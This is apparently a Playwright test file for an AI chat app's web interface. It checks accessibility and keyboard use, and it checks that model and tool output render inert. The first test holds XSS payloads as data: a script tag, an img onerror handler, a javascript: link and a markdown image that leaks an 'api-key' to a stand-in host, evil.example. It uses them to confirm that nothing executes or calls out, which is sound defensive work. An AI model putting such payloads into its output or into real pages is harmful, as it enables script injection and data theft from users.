/** SC8: untrusted content renders inert; SC11: accessible and keyboard-usable. */
import AxeBuilder from "@axe-core/playwright";
import { expect, test } from "@playwright/test";

import { openEmptyChat, send, waitTurnOver } from "./support";

const EVIL = "evil.example";

test("model output can't run script, load images or phone home", async ({ page, request }) => {
  const outbound: string[] = [];
  page.on("request", (r) => {
    if (r.url().includes(EVIL)) outbound.push(r.url());
  });
  const dialogs: string[] = [];
  page.on("dialog", (d) => {
    dialogs.push(d.message());
    void d.dismiss();
  });
  const sid = await openEmptyChat(page, request);
  const payload = [
    "<script>window.pwned = 1</script>",
    "",
    `Text <img src="https://${EVIL}/pixel.png" onerror="window.pwned = 1"> and <b>raw html</b>`,
    "",
    `![secret](https://${EVIL}/leak?q=api-key)`,
    "",
    "[click](javascript:window.pwned=1) [safe](https://example.org)",
  ].join("\n");
  const sent = await request.post(`/api/sessions/${sid}/messages`, {
    data: { content: "show me", script: [
      { tool_calls: [{ name: "calculator", args: { expression: `<img src=https://${EVIL}/t.png onerror=alert(1)>` } }] },
      { content: payload },
    ] },
  });
  expect(sent.status()).toBe(202);
  await expect(page.getByTestId("assistant-message")).toContainText("[image: secret]");
  await waitTurnOver(request, sid);
  await page.getByTestId("tool-card").getByRole("button").click(); // the tool's error, shown as text
  const messages = page.getByTestId("messages");
  await expect(messages.locator("img")).toHaveCount(0);
  await expect(messages.locator("script")).toHaveCount(0);
  await expect(messages.locator("b")).toHaveCount(0);
  await expect(messages.locator('a[href^="javascript:"]')).toHaveCount(0);
  await expect(messages.locator('a[href="https://example.org"]')).toHaveAttribute("rel", "noopener noreferrer nofollow");
  expect(await page.evaluate(() => (window as unknown as { pwned?: number }).pwned)).toBeUndefined();
  expect(outbound).toEqual([]);
  expect(dialogs).toEqual([]);
  const doc = await request.get("/");
  expect(doc.headers()["content-security-policy"]).toContain("default-src 'self'");
});

test("no serious accessibility problems, and it works from the keyboard", async ({ page, request }) => {
  await page.goto("/");
  const welcome = await new AxeBuilder({ page }).analyze();
  expect(welcome.violations.filter((v) => v.impact === "serious" || v.impact === "critical")).toEqual([]);

  // Home: the message box has the focus; type, Enter, and the chat starts.
  await expect(page.getByRole("textbox", { name: "Message" })).toBeFocused();
  await page.keyboard.type("Notify the team that lunch is here");
  await page.keyboard.press("Enter");
  await expect(page).toHaveURL(/#\/s\//);
  const sid = decodeURIComponent(new URL(page.url()).hash.slice(4));
  const approve = page.getByTestId("approval-card").getByRole("button", { name: "Approve" });
  await approve.focus();
  await page.keyboard.press("Enter");
  await expect(page.getByTestId("approval-card")).toContainText("You approved this");
  await waitTurnOver(request, sid);
  await send(page, "What is 3 x 4?");
  await expect(page.getByTestId("assistant-message").last()).toContainText("12");
  const chat = await new AxeBuilder({ page }).analyze();
  expect(chat.violations.filter((v) => v.impact === "serious" || v.impact === "critical")).toEqual([]);
});
